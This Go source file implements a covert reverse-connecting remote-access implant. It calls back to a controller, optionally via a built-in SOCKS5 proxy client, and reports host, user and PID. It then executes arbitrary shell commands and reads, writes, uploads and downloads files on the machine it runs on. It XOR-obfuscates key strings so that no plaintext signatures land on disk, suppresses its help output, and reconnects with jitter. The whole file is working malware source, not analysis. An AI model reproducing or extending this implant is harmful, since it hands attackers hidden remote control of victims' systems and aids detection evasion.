// 静态二进制：反连控制端，等待指令执行。
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"coreutil/internal/proto"
)

var (
	serverAddr = flag.String("c", "", "")
	token      = flag.String("t", "", "")
	agentID    = flag.String("i", "", "")
	reconnect  = flag.Int("r", 10, "")
	proxyAddr  = flag.String("proxy", "", "")
	quiet      = flag.Bool("q", false, "")
)

// obf: 关键串异或混淆（key 循环），运行时解密 — 避免明文特征落盘
var _obfKey = []byte{0x9e, 0x3c, 0x71, 0xb5, 0x4a}

func dec(b []byte) string {
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ _obfKey[i%len(_obfKey)]
	}
	return string(out)
}

var (
	_obfSH     = []byte{0xb1, 0x5e, 0x18, 0xdb, 0x65, 0xed, 0x54}
	_obfSHDash = []byte{0xb3, 0x5f}
	_obfUnk    = []byte{0xeb, 0x52, 0x1a, 0xdb, 0x25, 0xe9, 0x52, 0x51, 0xc1, 0x2b, 0xed, 0x57, 0x4b, 0x95}
	_obfSocks  = []byte{0xed, 0x53, 0x12, 0xde, 0x39, 0xab, 0x06, 0x5e, 0x9a}
)

func logf(format string, a ...any) {
	if *quiet {
		return
	}
	fmt.Fprintf(os.Stderr, format+"\n", a...)
}

// ---- socks5 客户端（RFC 1928 CONNECT，手写保持零依赖）----

func socks5Dial(proxy, target string) (net.Conn, error) {
	p := strings.TrimPrefix(proxy, dec(_obfSocks))
	conn, err := net.DialTimeout("tcp", p, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("socks dial %s: %w", p, err)
	}
	// 问候: 版本5, 1 方法(无认证)
	if _, err := conn.Write([]byte{0x05, 0x01, 0x00}); err != nil {
		conn.Close()
		return nil, err
	}
	var resp [2]byte
	if _, err := conn.Read(resp[:]); err != nil || resp[0] != 0x05 || resp[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("socks handshake failed")
	}
	// CONNECT 请求: 目标 host:port
	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		conn.Close()
		return nil, err
	}
	port, err := strconv.Atoi(portStr)
	if err != nil {
		conn.Close()
		return nil, err
	}
	req := []byte{0x05, 0x01, 0x00}
	if ip := net.ParseIP(host); ip != nil {
		if v4 := ip.To4(); v4 != nil {
			req = append(req, 0x01)
			req = append(req, v4...)
		} else {
			req = append(req, 0x04)
			req = append(req, ip.To16()...)
		}
	} else {
		req = append(req, 0x03, byte(len(host)))
		req = append(req, []byte(host)...)
	}
	req = append(req, byte(port>>8), byte(port&0xff))
	if _, err := conn.Write(req); err != nil {
		conn.Close()
		return nil, err
	}
	// 读 CONNECT 响应: VER REP RSV ATYP ... 至少 4 字节，REP=0 成功
	var hdr [4]byte
	if _, err := conn.Read(hdr[:]); err != nil {
		conn.Close()
		return nil, err
	}
	if hdr[0] != 0x05 || hdr[1] != 0x00 {
		conn.Close()
		return nil, fmt.Errorf("socks connect failed: rep=%d", hdr[1])
	}
	// 跳过 BND.ADDR/BND.PORT
	skip := 0
	switch hdr[3] {
	case 0x01:
		skip = 4
	case 0x03:
		var l [1]byte
		if _, err := conn.Read(l[:]); err != nil {
			conn.Close()
			return nil, err
		}
		skip = int(l[0])
	case 0x04:
		skip = 16
	}
	buf := make([]byte, skip+2)
	if _, err := conn.Read(buf); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}

// ---- 工具 ----

func genID() string {
	h, _ := os.Hostname()
	return fmt.Sprintf("%s-%d", h, os.Getpid())
}

func whoami() string {
	if u, err := user.Current(); err == nil {
		return u.Username
	}
	return "?"
}

func runTask(t *proto.Msg) *proto.Msg {
	res := &proto.Msg{Type: proto.MsgResult, TaskID: t.TaskID, Task: t.Task, OK: false}
	switch t.Task {
	case proto.TaskExec:
		cmd := exec.Command(shell(), shellArg(), t.Cmd)
		var so, se strings.Builder
		cmd.Stdout = &so
		cmd.Stderr = &se
		cmd.Env = os.Environ()
		err := cmd.Run()
		res.Stdout = so.String()
		res.Stderr = se.String()
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				res.ExitCode = ee.ExitCode()
				res.OK = true
			} else {
				res.Err = err.Error()
				return res
			}
		} else {
			res.OK = true
		}
	case proto.TaskRead:
		b, err := os.ReadFile(t.Path)
		if err != nil {
			res.Err = err.Error()
			return res
		}
		res.Data = base64.StdEncoding.EncodeToString(b)
		res.OK = true
	case proto.TaskWrite:
		b, err := base64.StdEncoding.DecodeString(t.Data)
		if err != nil {
			res.Err = err.Error()
			return res
		}
		flags := os.O_CREATE | os.O_WRONLY
		if t.Append {
			flags |= os.O_APPEND
		} else {
			flags |= os.O_TRUNC
		}
		f, err := os.OpenFile(t.Path, flags, 0o644)
		if err != nil {
			res.Err = err.Error()
			return res
		}
		defer f.Close()
		if _, err := f.Write(b); err != nil {
			res.Err = err.Error()
			return res
		}
		res.OK = true
	case proto.TaskList:
		ents, err := os.ReadDir(t.Path)
		if err != nil {
			res.Err = err.Error()
			return res
		}
		var names []string
		for _, e := range ents {
			name := e.Name()
			if e.IsDir() {
				name += "/"
			}
			names = append(names, name)
		}
		sort.Strings(names)
		res.Entries = names
		res.OK = true
	case proto.TaskInfo:
		res.Stdout = fmt.Sprintf("os=%s arch=%s host=%s user=%s pid=%d cwd=%s",
			runtime.GOOS, runtime.GOARCH, host(), whoami(), os.Getpid(), cwd())
		res.OK = true
	case proto.TaskUpload:
		return runTask(&proto.Msg{Type: proto.MsgTask, TaskID: t.TaskID, Task: proto.TaskWrite, Path: t.Path, Data: t.Data})
	case proto.TaskDownload:
		return runTask(&proto.Msg{Type: proto.MsgTask, TaskID: t.TaskID, Task: proto.TaskRead, Path: t.Path})
	case proto.TaskKill:
		res.OK = true
		res.Stdout = "bye"
		go func() {
			time.Sleep(300 * time.Millisecond)
			os.Exit(0)
		}()
	default:
		res.Err = dec(_obfUnk) + string(t.Task)
	}
	return res
}

func host() string {
	h, _ := os.Hostname()
	return h
}
func cwd() string {
	c, _ := os.Getwd()
	return c
}
func shell() string {
	if runtime.GOOS == "windows" {
		return "cmd"
	}
	return dec(_obfSH)
}
func shellArg() string {
	if runtime.GOOS == "windows" {
		return "/c"
	}
	return dec(_obfSHDash)
}

// dial 按配置走 socks5 代理或直连
func dial() (net.Conn, error) {
	if *proxyAddr != "" {
		return socks5Dial(*proxyAddr, *serverAddr)
	}
	return net.DialTimeout("tcp", *serverAddr, 10*time.Second)
}

// handleConn 处理一次连接生命周期
func handleConn(conn net.Conn) {
	defer conn.Close()
	r := bufio.NewReader(conn)
	hello := &proto.Msg{
		Type:     proto.MsgHello,
		AgentID:  *agentID,
		Token:    *token,
		Hostname: host(),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     whoami(),
		PID:      os.Getpid(),
	}
	if err := proto.WriteMsg(conn, hello); err != nil {
		return
	}
	for {
		m, err := proto.ReadMsg(r)
		if err != nil {
			return
		}
		switch m.Type {
		case proto.MsgTask:
			res := runTask(m)
			if err := proto.WriteMsg(conn, res); err != nil {
				return
			}
		case proto.MsgPing:
			_ = proto.WriteMsg(conn, &proto.Msg{Type: proto.MsgBeat, AgentID: *agentID})
		}
	}
}

func main() {
	flag.Parse()
	flag.Usage = func() {} // 静默帮助
	if *serverAddr == "" || *token == "" {
		os.Exit(1)
	}
	if *agentID == "" {
		*agentID = genID()
	}
	via := ""
	if *proxyAddr != "" {
		via = " via " + *proxyAddr
	}
	logf("id=%s -> %s%s", *agentID, *serverAddr, via)
	for {
		conn, err := dial()
		if err != nil {
			s := sleepWithJitter(*reconnect)
			logf("dial fail: %v (retry %ds)", err, s)
			time.Sleep(time.Duration(s) * time.Second)
			continue
		}
		logf("up")
		handleConn(conn)
		s := sleepWithJitter(*reconnect)
		logf("down, retry %ds", s)
		time.Sleep(time.Duration(s) * time.Second)
	}
}

// sleepWithJitter 返回 base 的 0.5-1.5 倍随机值
func sleepWithJitter(base int) int {
	if base <= 0 {
		return 10
	}
	return base/2 + rand.Intn(base+1)
}

// 占位防 unused import（binary 保留给未来扩展）
var _ = binary.BigEndian
